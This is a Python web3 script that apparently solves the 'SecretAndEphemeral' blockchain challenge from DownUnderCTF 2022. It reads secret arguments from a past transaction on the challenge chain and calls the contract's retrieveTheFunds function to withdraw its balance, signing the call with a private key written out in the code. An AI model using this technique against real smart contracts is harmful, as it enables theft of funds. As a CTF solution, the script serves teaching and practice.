from web3 import Web3
from web3.middleware import geth_poa_middleware
import json

url = "https://blockchain-secretandephemeral-87fd2f23e11f2cb3-eth.2022.ductf.dev/"
contractAddress = "0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8"
privateKey = "0x58162c38eff43e9128b27b7dfdab52717c83bec2ff5a46e7ca4331ffbf9cff7f"
w3 = Web3(Web3.HTTPProvider(url))

with open("SecretAndEphemeral.json") as f:       #json file with the contract ABI
    SecretAndEphemeral_json = json.load(f)

print("Is connected? ", w3.isConnected())
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

'''rightBlock = w3.eth.get_block(4)
rightTx = w3.eth.get_transaction(str(((w3.eth.get_block(4).transactions)[1]).hex()))'''

sender = w3.toChecksumAddress("0x7BCF8A237e5d8900445C148FC2b119670807575b")
# sender address of the second transaction contained in block 4
number = 233573869 
# int conversion of: 0xdec0ded
string = "so anyways i just started blasting" 
# string convertion of: 0x22736f20616e79776179732069206a757374207374617274656420626c617374696e67
nonce = 0

SecretAndEphemeral = w3.eth.contract(address=contractAddress, abi = SecretAndEphemeral_json)
print(SecretAndEphemeral)
print(SecretAndEphemeral.functions.spooky_hash().call())

transaction = SecretAndEphemeral.functions.retrieveTheFunds(string, number, sender).buildTransaction({
    'gas': 70000,
    'gasPrice': Web3.toWei(40, 'gwei'), 
    'nonce': nonce
})      #Withdraw all the token to the sender address
signed_txn = w3.eth.account.signTransaction(transaction, private_key=privateKey)
w3.eth.sendRawTransaction(signed_txn.rawTransaction)